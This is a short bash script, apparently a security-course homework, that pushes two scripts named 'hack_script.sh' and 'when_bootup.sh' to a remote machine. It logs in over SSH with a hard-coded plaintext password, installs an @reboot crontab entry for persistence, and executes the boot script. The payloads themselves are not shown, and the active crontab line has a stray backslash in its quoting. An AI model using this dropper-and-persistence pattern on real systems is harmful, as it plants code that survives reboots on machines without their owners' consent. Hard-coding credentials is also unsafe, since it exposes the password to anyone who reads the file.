#!/bin/bash

# Variables
local_file="/home/mrs/amniat_hw/hack_script.sh"
local_file2="/home/mrs/amniat_hw/when_bootup.sh"
remote_user="javad"
remote_ip="172.17.9.201"
remote_directory="/home/javad/Desktop/amniat_project"
remote_file="/hack_script.sh"
remote_file2="/when_bootup.sh"

# Copy script file using scp with password authentication
sshpass -p "13571388" scp "$local_file" "$local_file2" "$remote_user@$remote_ip:$remote_directory"

# Run the script on the remote system

sshpass -p "13571388" ssh "$remote_user@$remote_ip" "chmod +x $remote_directory$remote_file && chmod +x $remote_directory$remote_file2"

# sshpass -p "13571388" ssh "$remote_user@$remote_ip" "bash $remote_directory$remote_file && echo \"@reboot /home/javad/Desktop/amniat_project/when_bootup.sh\" | crontab - && bash /home/javad/Desktop/amniat_project/when_bootup.sh"
 sshpass -p "13571388" ssh "$remote_user@$remote_ip" "echo '@reboot /home/javad/Desktop/amniat_project/when_bootup.sh\' | crontab - && bash /home/javad/Desktop/amniat_project/when_bootup.sh"
#sshpass -p "13571388" ssh "$remote_user@$remote_ip" "bash /home/javad/Desktop/amniat_project/when_bootup.sh"

